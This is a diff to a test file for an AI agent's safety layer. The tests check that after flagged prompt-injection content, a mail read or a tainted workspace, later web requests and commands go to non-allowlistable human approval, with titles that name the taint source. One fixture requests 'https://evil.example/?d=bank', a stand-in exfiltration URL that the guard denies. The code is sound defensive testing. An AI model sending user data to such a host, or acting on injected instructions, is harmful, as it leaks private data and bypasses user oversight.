@@ -9,7 +9,7 @@ const recordEvent = vi.fn()
 vi.mock('../observability/record', () => ({ withSpan: (_m: unknown, fn: () => unknown) => fn(), recordEvent: (e: unknown) => recordEvent(e) }))
 vi.mock('./bus', () => ({ publishActivity: () => {} }))
 
-import { buildAiTools, OUTBOUND_WEB_TITLE, TAINTED_COMMAND_TITLE, type RunHooks } from './ai-tools'
+import { buildAiTools, TAINT_TITLES, taintTitles, type RunHooks } from './ai-tools'
 import type { AgentTool, ApprovalRequest, ToolResultEvent } from './types'
 import { guardOutput, guardWarning, INJECTION_WARNING_KEY, type GuardInput, type GuardVerdict } from './judge/guard'
 import { setWorkspaceRuntime, taintRunWorkspace, type WorkspaceRuntime } from '../sandbox/runtime'
@@ -90,7 +90,11 @@ describe('output guard on the result path', () => {
     await call('web_fetch', { url: 'https://a.example' })
     expect(await call('web_fetch', { url: 'https://evil.example/?d=bank' })).toEqual({ denied: true })
     expect(ask).toHaveBeenCalledTimes(1)
-    expect(ask.mock.calls[0]![0]).toMatchObject({ tool: 'web_fetch', title: OUTBOUND_WEB_TITLE, allowlistable: false })
+    // Fix round 0 (C1): titled and explained by the real reason — flagged content, not a mail read.
+    expect(ask.mock.calls[0]![0]).toMatchObject({ tool: 'web_fetch', title: 'Web request after flagged content', allowlistable: false })
+    expect(ask.mock.calls[0]![0].command).toMatch(/^web_fetch — Bridget read content the injection guard flagged as instructions aimed at her, and this request sends/)
+    expect(ask.mock.calls[0]![0].command).not.toContain('Google mail')
+    expect(ask.mock.calls[0]![0].logSummary).toBe('web_fetch: outbound in a tainted run (flagged; 33 chars)')
     expect(fetched).toEqual(['https://a.example'])
   })
 
@@ -99,7 +103,33 @@ describe('output guard on the result path', () => {
     const { call, ask } = setup()
     await call('web_fetch', { url: 'https://a.example' })
     await call('exec', { command: 'ls' })
-    expect(ask.mock.calls[0]![0]).toMatchObject({ tool: 'exec', title: TAINTED_COMMAND_TITLE, allowlistable: false })
+    expect(ask.mock.calls[0]![0]).toMatchObject({ tool: 'exec', title: 'Command after flagged content', allowlistable: false })
+  })
+
+  it('C1: the heading follows the taint source — mail, a tainted workspace, flagged content; the lead names each', async () => {
+    const { call, ask } = setup({ initialTaint: { sources: ['workspace'], flags: [] } })
+    await call('web_fetch', { url: 'https://w.example' })
+    expect(ask.mock.calls[0]![0]).toMatchObject({ title: 'Web request from a tainted workspace' })
+    expect(ask.mock.calls[0]![0].command).toContain('Bridget used a workspace that has handled untrusted content, and this request')
+    // A bare 79b seed is a mail read, worded exactly as before.
+    const m = setup({ initiallyTainted: true })
+    await m.call('web_fetch', { url: 'https://m.example' })
+    expect(m.ask.mock.calls[0]![0]).toMatchObject({ title: 'Web request after reading your mail' })
+    expect(m.ask.mock.calls[0]![0].logSummary).toBe('web_fetch: outbound after a Google read (22 chars)')
+    // initialTaint wins over the boolean.
+    const both = setup({ initiallyTainted: true, initialTaint: { sources: ['workspace'], flags: [] } })
+    await both.call('web_fetch', { url: 'https://b.example' })
+    expect(both.ask.mock.calls[0]![0]).toMatchObject({ title: 'Web request from a tainted workspace' })
+  })
+
+  it('C1: titles by the most specific source, the lead lists all of them in order', () => {
+    expect(taintTitles(['workspace', 'mail', 'flagged'])).toEqual({
+      web: TAINT_TITLES.flagged.web, background: TAINT_TITLES.flagged.background, command: TAINT_TITLES.flagged.command,
+      lead: [TAINT_TITLES.flagged.clause, TAINT_TITLES.mail.clause, TAINT_TITLES.workspace.clause].join('; ')
+    })
+    expect(taintTitles(['workspace', 'mail']).web).toBe(TAINT_TITLES.mail.web)
+    expect(taintTitles(['workspace']).background).toBe('Background work from a tainted workspace')
+    expect(taintTitles([]).web).toBe('Web request after reading your mail')
   })
 
   it('emits the output_warning DTO on the tool-result event (the recorded result is the wrapped one)', async () => {
